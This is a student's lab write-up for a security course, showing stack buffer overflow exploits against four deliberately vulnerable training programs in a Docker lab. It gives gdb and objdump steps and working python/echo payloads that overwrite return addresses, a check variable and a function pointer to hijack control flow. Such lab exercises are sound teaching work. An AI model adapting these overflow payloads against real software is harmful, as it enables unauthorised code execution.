"""
@author: Nguyen Duc Tri 
@id: 22110082
"""
# BUFFER OVERFLOW ATTACK 
# BOF1.c
## I. Prepare for the lab environment

The Dockerfile is used to build a Docker image with all the required packages for Hands-On Assembly & Security labs.

### How to use:

1. Open Docker Desktop on your computer (host machine).

2. Open Terminal

   ```bash
   git clone https://github.com/quang-ute/myprojects
   ```
   and

   ```bash
   cd myprojects
   ```

4. Build the image `img4lab` that comprises all the required packages for labs by running the following command:

   ```bash
   docker build -t img4lab .
3. Run docker container from previously built image
   ```bash
   docker run -it --privileged -v $HOME/seclabs:/home/seed/seclabs img4lab
`Seclabs` is created inside student's home folder. <br>

4. On seed machine:
   
   ```bash
   cd seclabs
   ```
   then make a direction for a new file, named `bof`:

   ```bash
   mkdir bof
   ```
   and finally 

   ```bash
   cd bof
   ```


## II. Interpret the attack: 

![image](https://github.com/user-attachments/assets/6bb8d95d-f457-46a7-a910-be766ac038a8)

`For exploiting this, just filling up the buffer 200 bytes, EBP, and placing the memory address of secretFunc() into EIP. 
Instead of returning to its original position to continue the normal program flow, the EIP will now point to the secretFunc() and execute it.`

## III. Conducting the attack

1. Access to seclabs and bof
   
![image](https://github.com/user-attachments/assets/f2f34d52-070e-44f2-8685-b0c9bf3aa9bd)

2. Go to VSCode by
   
![image](https://github.com/user-attachments/assets/92550cbb-4fba-472e-ad5c-ca4d5b3383c2)

3. In VSCode terminal, run docker container from previously built image and change directory -> seclabs -> bof 

4. On seed machine

![image](https://github.com/user-attachments/assets/e5366856-381f-4238-a1ad-0be0ec61315c)

> **Note:** After typing the command, you might see a warning about the declaration of the function `get`. This is due to `get` was removed in C11. Nevermind to this warning, it will not affect the attack process. 

5. Load bof1.out in gdb

![image](https://github.com/user-attachments/assets/a3081e17-82db-438b-a825-d112f13ab5f3)

6. Once you load out bof1.out in gdb, use the disassemble command to display the assembly code for a <b>secretFunc()</b> memory region

![image](https://github.com/user-attachments/assets/c5ac8bac-3365-459e-b8db-70af5400a134)

7. The secretFunc() memory region is `0x0804846b`. Now, we must exit the gdb by typing `q`

8. Input 204 'a' characters followed by the address of secretFunc()

![image](https://github.com/user-attachments/assets/8af57690-4b4d-4ae1-bfa1-9126b8ac024b)

9. Remove the missing arguments line, add the variables a,b,1,2,... to the end of bof1.out

![image](https://github.com/user-attachments/assets/c75f57d2-fa2b-432a-b67b-7c771c1f6d6b)

# BOF2.c 
## I. Interpret the attack:

![image](https://github.com/user-attachments/assets/f6dbdf24-0a77-473c-ba52-81caa5b3aded)

`Since the buffer buf is only 40 bytes, but the program reads up to 45 bytes, if we enters more than 40 characters, the excess characters will overwrite the memory occupied by check.`

## II. Conducting the attack: 

Every initialized step has to be done like the attack on `bof1.c` file.

If you want to print out this statement `printf("\nYou are on the right way!\n");`
```bash
echo $(python -c "print('a'*40 + '\x01\x02\x03\x02')") | ./bof2.out
```

![image](https://github.com/user-attachments/assets/1fb903d5-94cd-47e6-b63c-4d464a09685e)

Else print out this statement `printf("Yeah! You win!\n");`
```bash
echo $(python -c "print('a'*40 + '\xef\xbe\xad\xde')") | ./bof2.out
```

![image](https://github.com/user-attachments/assets/4a925412-a9ee-40bf-9ab1-613e2c176069)

# BOF3.c 
## I. Interpret the attack:

![image](https://github.com/user-attachments/assets/3fd5198e-249c-439b-959e-31bf79ce73ba)

` The goal is to overwrite the func() pointer with the address of the shell() so that, when func() is called, it executes shell() instead of sup().`

## II. Conducting the attack: 

Every initialized step has to be done like the attack on `bof1.c` file.

In order not to load into `gdb bof3.out` and `disas shell` function to get a memory region of shell(), we can
```bash
objdump -d bof3.out | grep shell
```

So that the address of shell() will be displayed below:

![image](https://github.com/user-attachments/assets/5347273d-cc2d-49f7-a991-8bf9608349ae)

The attack: 
```bash
echo $(python -c "print('a'*128 + '\x5b\x84\x04\x08')") | ./bof3.out
```
![image](https://github.com/user-attachments/assets/1521539c-ebe3-4fb7-9973-03c0738778c8)

# CTF.c
## I. Interpret the attack: 

![image](https://github.com/user-attachments/assets/b991c129-95b3-4019-bb24-e836b75fad28)

The goal of the attack is to force the program to execute `myfunc()` with the correct values for `p` `(0x04081211)` and `q` `(0x44644262)`.

By exploiting buffer overflows to overwrite return addresses, we can access into the `myfunc()`. 

## II. Conducting the attack: 

1. At first, we need to know the address of `myfunc()`:
```bash
objdump -d ctf.out | grep myfunc
```

![image](https://github.com/user-attachments/assets/50a203d4-80dd-470b-8a96-a06939e05741)

2. `disas myfunc` to have a brief analysis:

![image](https://github.com/user-attachments/assets/1cc99368-6cbf-46a6-848a-f4ca1ee3d67e)

The `myfunc` absolutely does not exist in stack frame, so do these 2 integer variable `p` and `q`. 

Thus, the idea is to determine exactly the location of `p` and `q` in stack frame. And I will assign directly the value of them before executing the program. 

3. Determine the ebp's location.

The first thing that we need to know is where the ebp is located after finishing the execution of the `vuln()`. 

![image](https://github.com/user-attachments/assets/86c4ea05-39ad-4a30-85cd-02b297925f2d)


> **Note:** Let's have a look at leave and ret. <br>
> (1) is a location of `esp` before the `vuln()` executed. <br>
> (2) After the `vuln()` has been done executing, the `esp` will move to the place where `ebp` is standing. (move ebp, esp). <br>
> (3) The value of `ebp` in stack frame, will be copied to (the purple line), and disappear later on. `esp`, therefore, it will move down as show in the figure. <br>
> (4) We will meet the `ret` (the program now navigates to `myfunc()`, which is `0x0804851b). The `esp` location is shown in the figure. 

The next thing is the location of `esp` when loading into `myfunc()` 

![image](https://github.com/user-attachments/assets/c870260a-85c6-4e37-8667-565d314ae041)

The location of of `p` and `q` is: ` 100 + 4 (blank) + \x1b\x85\x04\x08 (ret) + 4 (s) + \x11\x12\x08\x04 + \x62\x42\x64\x44 `  

4. Conducting an attack:
```bash
echo $(python -c "print('a'*104 + '\x1b\x85\x04\x08' + 'b'*4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
```







